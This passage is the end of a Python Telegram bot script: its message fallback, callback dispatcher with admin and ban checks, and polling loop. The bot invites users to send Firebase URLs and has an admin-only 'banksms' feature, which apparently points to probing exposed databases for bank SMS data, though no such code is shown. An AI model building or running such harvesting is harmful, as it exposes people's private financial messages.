        ).start()
        return

    # Unknown
    if not text.startswith("/"):
        send(chat_id,
            f"<b>💡 KYA KARNA HAI?</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• Firebase URL bhejo\n"
            f"• /help dekho\n"
            f"• /stats dekho",
            buttons=[[("📖 Help", "help")]])


def handle_callback(cb):
    cb_id = cb.get("id")
    uid = cb.get("from", {}).get("id")
    chat_id = cb.get("message", {}).get("chat", {}).get("id")
    data = cb.get("data", "")

    if not uid or not chat_id:
        answer_cb(cb_id); return

    if uid in BANNED and uid != ADMIN_ID:
        answer_cb(cb_id, "🚫 Banned", alert=True); return

    is_admin = (uid == ADMIN_ID)

    try:
        if data == "menu":
            user_welcome(chat_id, uid,
                         cb.get("from", {}).get("first_name", "?"),
                         cb.get("from", {}).get("username", ""))
            answer_cb(cb_id)
        elif data == "help":
            user_help(chat_id, uid); answer_cb(cb_id)
        elif data == "mystats":
            user_stats(chat_id, uid); answer_cb(cb_id)
        elif data == "global_stats":
            user_global_stats(chat_id); answer_cb(cb_id)
        elif data == "admin_panel" and is_admin:
            admin_panel(chat_id); answer_cb(cb_id)
        elif data == "banksms_help" and is_admin:
            banksms_help(chat_id); answer_cb(cb_id)
        else:
            answer_cb(cb_id)
    except Exception as e:
        tlog(f"callback error: {e}", "ERR")
        answer_cb(cb_id)

# ═══════════════════════════════════════════════════════════════════════
#  🚀 MAIN LOOP
# ═══════════════════════════════════════════════════════════════════════

def main():
    banner()

    tlog("Starting bot...", "INFO")
    tlog(f"Token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-8:]}", "INFO")
    tlog(f"Admin ID: {ADMIN_ID}", "INFO")

    me = tg("getMe")
    if not me or not me.get("ok"):
        tlog("INVALID TOKEN", "ERR")
        sys.exit(1)

    b = me["result"]
    ok(f"Bot: @{b.get('username')} ({b.get('first_name')})")

    tlog("Clearing old updates...", "INFO")
    try:
        tg("deleteWebhook", {"drop_pending_updates": True})
        time.sleep(1)
    except Exception:
        pass

    offset = 0
    try:
        r = tg("getUpdates", {"timeout": 1, "offset": -1})
        if r and r.get("ok") and r.get("result"):
            offset = r["result"][-1]["update_id"] + 1
            tlog(f"Offset set to {offset}", "INFO")
    except Exception:
        pass

    print(f"\n  {C}╔{'═' * 60}╗{N}")
    inf("Long-polling started (Ctrl+C to stop)")
    inf("Public bot — anyone can use")
    inf(f"Admin: /admin | /banksms")
    print(f"  {C}╚{'═' * 60}╝{N}\n")

    poll_count = 0
    while True:
        try:
            poll_count += 1
            r = tg("getUpdates", {"offset": offset, "timeout": 30})
            if not r:
                time.sleep(3); continue
            if not r.get("ok"):
                tlog(f"getUpdates: {r.get('description', '?')}", "WARN")
                time.sleep(3); continue

            updates = r.get("result", [])
            if updates:
                tlog(f"Poll #{poll_count}: {len(updates)} update(s)", "DEBUG")

            for upd in updates:
                offset = upd["update_id"] + 1

                if "message" in upd:
                    msg = upd["message"]
                    text = msg.get("text", "")
                    name = msg.get("from", {}).get("first_name", "?")
                    uid = msg.get("from", {}).get("id")
                    tlog(f"MSG from {name}({uid}): {text[:60]}", "INFO")
                    try:
                        handle_message(msg)
                    except Exception as e:
                        tlog(f"handle_message crash: {e}", "ERR")

                elif "callback_query" in upd:
                    cb = upd["callback_query"]
                    tlog(f"CB: {cb.get('data', '')}", "DEBUG")
                    try:
                        handle_callback(cb)
                    except Exception as e:
                        tlog(f"handle_callback crash: {e}", "ERR")

        except KeyboardInterrupt:
            tlog("Bot stopped by user", "INFO")
            print(f"\n  {M}💎 Made with ❤️  by {BRAND}{N}\n")
            break
        except Exception as e:
            tlog(f"poll error: {e}", "ERR")
            time.sleep(3)


if __name__ == "__main__":
    main()
